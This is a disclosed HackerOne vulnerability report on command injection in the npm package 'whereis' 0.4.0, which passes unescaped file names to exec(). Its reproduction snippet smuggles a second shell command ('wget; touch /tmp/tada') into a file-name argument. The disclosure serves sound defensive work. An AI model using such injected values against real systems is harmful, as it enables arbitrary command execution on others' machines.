---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '319476'
original_report_id: '319476'
title: '`whereis` concatenates unsanitized input into exec() command'
weakness: Command Injection - Generic
team_handle: nodejs-ecosystem
created_at: '2018-02-25T06:53:14.046Z'
disclosed_at: '2018-03-28T06:17:58.607Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
asset_identifier: whereis
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- command-injection-generic
---

# `whereis` concatenates unsanitized input into exec() command

## Metadata

- HackerOne Report ID: 319476
- Weakness: Command Injection - Generic
- Program: nodejs-ecosystem
- Disclosed At: 2018-03-28T06:17:58.607Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report command injection in `whereis`
It allows to inject arbitrary shell commands by trying to locate crafted filenames.

# Module

**module name:** whereis
**version:** 0.4.0
**npm page:** `https://www.npmjs.com/package/whereis`

## Module Description

> Simply get the first path to a bin on any system.

## Module Stats

Stats
101 downloads in the last day
5 403 downloads in the last week
18 945 downloads in the last month

~227 340 estimated downloads per year [JUST FOR REFERENCE,  ~DOWNLOADS PER MONTH*12]

# Vulnerability

## Vulnerability Description

File name argument is not properly escaped before being concatenated into the command that is passed to `exec()`.

See lines https://github.com/vvo/node-whereis/blob/master/index.js#L4-L12

## Steps To Reproduce:

```js
var whereis = require('whereis');
var filename = 'wget; touch /tmp/tada';
whereis(filename, function(err, path) {
  console.log(path);
});
```

Observe file `/tmp/tada` created.

## Supporting Material/References:

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0
- bash 4.4.012

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

For setups where unsanitized user input could end up in `whereis` argument, users would be able to execute arbitrary shell commands.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
